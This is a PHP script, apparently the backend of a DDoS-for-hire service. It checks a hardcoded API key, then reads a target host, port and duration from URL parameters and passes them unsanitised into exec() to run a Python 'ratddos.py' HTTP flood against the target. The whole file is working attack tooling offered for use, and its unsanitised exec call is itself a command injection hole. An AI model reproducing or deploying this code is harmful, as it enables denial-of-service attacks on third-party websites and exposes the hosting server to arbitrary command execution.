<?php

    // Usage http://SERVERIP/httpflood.php?Key=heliosapi&host=[]&port=[]&bytes=[]&time=[]&type=[]
    
    $apikey = $_GET['Key'];
    $target = $_GET['host'];
    $port = $_GET['port'];
    $method = $_GET['type'];
    $time = $_GET['time'];
    
    if ($apikey != "Kobeni1337") {
    exit("Invailed APIKEY");
    }
    
        if ($method == "") {  
        exit("method is http");
        }
        if ($target == "") {
            exit("enter site?");
        }      
         if ($time > 600) {
            exit("max is 600 time");
        }    
        if ($port > 65535) {
            exit("max port is 65535");
        }
        if ($port < 0) {
            exit("min port is 0");
        }
        
        if ($method == "HTTP"){                  
        echo "HTTP-FLOOD sent with $method to $target for $time seconds";
        exec("python3 ratddos.py $target $port $time HTTP");           
        }  
       
      
    
    
?>